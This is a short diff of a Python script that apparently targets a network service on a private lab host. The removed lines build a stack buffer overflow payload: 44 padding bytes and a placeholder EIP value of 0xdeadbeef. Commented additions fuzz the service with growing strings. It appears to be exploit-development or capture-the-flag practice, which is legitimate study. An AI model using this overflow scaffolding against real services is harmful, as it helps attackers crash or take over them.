@@ -21,13 +21,17 @@ def main(s):
 	myAddr = "192.168.72.145"
 	myPort = "9000"
 	get(s)
-	#addReg(s, "iamalongaddress" ,"192.168.72.145")
+	#for test in range(1,90):
+	#addReg(s, "A"*test+str(test) ,"192.168.72.145")
+
 	#sendDb(s, myAddr, myPort)
-	#isUp(9000)
-	overflow = "A"*44 #Control of EBP, ESI, EDI
-	EIP = struct.pack("<I",0xdeadbeef)
-	sendString = overflow+EIP
-	checkname(s, sendString)
+	isUp(9000)
+
+	#overflow = "A"*44 #Control of EBP, ESI, EDI
+	#EIP = struct.pack("<I",0xdeadbeef)
+	#extra = "A"*4096 * 8
+	#sendString = overflow+EIP+extra
+	#checkname(s, sendString)
 
 s = socket.socket()
 s.connect(("192.168.72.134",20005)) 
